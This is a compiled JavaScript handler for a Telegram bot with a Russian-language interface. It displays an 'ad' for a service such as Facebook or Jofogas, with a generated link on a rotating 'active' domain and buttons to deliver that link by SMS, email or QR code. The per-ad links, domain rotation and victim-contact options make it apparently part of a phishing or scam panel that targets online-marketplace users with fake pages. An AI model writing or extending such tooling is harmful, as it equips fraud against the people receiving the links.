"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.handler = exports.composer = void 0;
const grammy_1 = require("grammy");
const database_1 = require("../../database");
const moment_1 = __importDefault(require("moment"));
const getPictureMenu_1 = require("../../helpers/getPictureMenu");
const getFlagEmoji_1 = require("../../helpers/getFlagEmoji");
exports.composer = new grammy_1.Composer();
exports.composer.callbackQuery(/^ad (?<id>\d+)/gmi, handler);
async function handler(ctx) {
    try {
        await ctx.deleteMessage().then();
    }
    catch (e) {
        console.log(e);
    }
    const match = /^ad (?<id>\d+)/gmi.exec(ctx.callbackQuery.data);
    const ad = await database_1.adsRepository.findOne({
        relations: ['profile'],
        where: {
            id: Number(match.groups.id)
        }
    });
    if (!ad)
        return ctx.reply('ad undefined');
    const domen = await database_1.domensRepository.findOne({
        where: {
            active: true,
            service: ad.service
        }
    });
    const keyb = new grammy_1.InlineKeyboard();
    keyb.row();
    if (ad.service === 'facebook' || ad.service === 'jofogas') {
        keyb.text("📲 SMS", `sms ${ad.service} ad ${ad.id}`);
        keyb.text("💌 EMAIL", `email ${ad.service} ad ${ad.id}`);
    }
    else {
        keyb.text("📲 SMS", `sms ad ${ad.id}`);
        keyb.text("💌 EMAIL", `email ad ${ad.id}`);
    }
    keyb.row();
    keyb.text("🎲 QR-code", `qrcode get ${ad.id}`);
    keyb.text("⚙ Настройки", `settings ad ${ad.id}`);
    keyb.row();
    keyb.text("Главное меню", `menuWithPicture`);
    await ctx.replyWithPhoto(await (0, getPictureMenu_1.getPictureMenu)(ctx.user), {
        caption: `
🐨 ID объявления: <code>${ad.date}</code>

🌳 <b>Название:</b> <code>${ad.title}</code>
🌳 <b>Цена:</b> <code>${ad.price}</code>
🌳 <b>Платформа: ${ad.service.toUpperCase()} [${ad.country.toUpperCase()} ${(0, getFlagEmoji_1.getFlagEmoji)(ad.country)}]</b>${(ad.profile) ? `\n<b>🌳 Профиль:</b> <code>${ad.profile.fullName}</code>` : ''} 
♻️ <b>Домен сменён ${(0, moment_1.default)(domen.dateChange).fromNow()}</b>
➖➖➖➖➖➖➖
💠 <b>Созданная ссылка:</b> <a href="https://${domen.link}/link/${ad.link}">LINK</a>

`,
        reply_markup: keyb
    });
}
exports.handler = handler;
